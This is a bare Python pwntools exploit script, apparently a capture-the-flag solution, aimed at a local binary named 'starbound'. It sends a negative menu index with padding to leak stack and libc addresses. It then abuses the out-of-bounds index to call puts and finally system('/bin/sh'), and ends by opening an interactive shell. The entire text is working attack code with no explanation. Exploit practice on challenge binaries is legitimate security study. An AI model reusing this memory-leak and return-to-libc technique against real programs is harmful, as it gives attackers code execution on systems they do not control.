from pwn import *
io=process("./starbound")
pay="-3118"+"a"*39
io.sendafter("> ",pay)
io.recvuntil("-3118aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
leak=u32(io.recv(4))
log.info("leak : "+str(hex(leak)))
pay=pay+"a"*16
io.sendafter("> ",pay)
io.recvuntil("-3118aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa")
stack_leak=u32(io.recv(4))
log.info("stack_leak : "+str(hex(stack_leak)))
io.sendlineafter("> ","6")
io.sendlineafter("> ","2")
stack=stack_leak-180
libc_start_main=0x08055050
puts=0x08048b90
io.sendlineafter("Enter your name: ",p32(0x08048e48))
ret=0x804a605
io.sendafter("> ","-33ccccc"+p32(puts)+p32(ret)+p32(libc_start_main))
libc_leak=u32(io.recv(4))
log.info("libc_leak : "+str(hex(libc_leak)))
io.sendlineafter("> ","6")
io.sendlineafter("> ","2")
gdb.attach(io)
system=libc_leak+0x22400
binsh=libc_leak+0x14094b
io.sendlineafter("Enter your name: ",p32(0x8048e48))
io.sendafter("> ","-33ccccc"+p32(system)+"cccc"+p32(binsh))
io.interactive()
